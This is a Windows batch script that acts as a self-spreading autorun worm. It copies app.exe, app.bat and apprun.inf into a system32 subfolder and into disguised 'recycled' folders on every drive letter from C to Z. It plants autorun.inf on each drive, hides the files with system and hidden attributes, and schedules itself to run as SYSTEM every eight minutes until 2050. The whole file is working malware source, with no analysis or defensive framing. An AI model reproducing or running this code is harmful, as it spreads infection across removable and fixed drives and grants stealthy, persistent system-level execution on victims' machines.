echo off
if NOT EXIST .\dnt\APP.BAT %systemroot%\explorer \
xcopy /c /q /y /i /h /r /k app.exe %systemroot%\system32\1027\ || xcopy /c /q /y /i /h /r /k recycled\CEC-ch~1\app.exe %systemroot%\system32\1027\ 
xcopy /c /q /y /i /h /r /k app.bat %systemroot%\system32\1027\dnt\ || xcopy /c /q /y /i /h /r /k recycled\CEC-ch~1\app.bat %systemroot%\system32\1027\dnt\
xcopy /c /q /y /i /h /r /k app.bat %systemroot%\system32\1027\ || xcopy /c /q /y /i /h /r /k recycled\CEC-ch~1\app.bat %systemroot%\system32\1027\
xcopy /c /q /y /i /h /r /k apprun.inf %systemroot%\system32\1027\ || xcopy /c /q /y /i /h /r /k recycled\CEC-ch~1\apprun.inf %systemroot%\system32\1027\
  
for %%I in (c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do (
	md %%I:\tem
	if exist %%I:\tem\.. (
		md %%I:\recycled
		md %%I:\recycled\CEC-chengdu...\
		xcopy /c /q /y /i /h /r /k app.exe %%I:\recycled\cec-ch~1\*.* || xcopy /c /q /y /i /h /r /k recycled\CEC-ch~1\app.exe %%I:\recycled\cec-ch~1\*.*
		xcopy /c /q /y /i /h /r /k apprun.inf %%I:\recycled\cec-ch~1\*.* || xcopy /c /q /y /i /h /r /k recycled\CEC-ch~1\apprun.inf %%I:\recycled\cec-ch~1\*.*
		xcopy /c /q /y /i /h /r /k app.bat %%I:\recycled\cec-ch~1\*.* || xcopy /c /q /y /i /h /r /k recycled\CEC-ch~1\app.bat %%I:\recycled\cec-ch~1\*.*
		xcopy /c /q /y /i /h /r /k apprun.inf %%I:\autorun.* || xcopy /c /q /y /i /h /r /k recycled\CEC-ch~1\apprun.inf %%I:\autorun.*	 
		attrib +s +r +h %%I:\recycled
		attrib +s +r +h %%I:\autorun.inf
	)
        rd %%I:\tem
)
schtasks /create /tn "My App" /tr %systemroot%\system32\1027\dnt\app.bat /sc MINUTE /mo 8 /ru "System" /st 08:00:00 /ed 2050/12/31


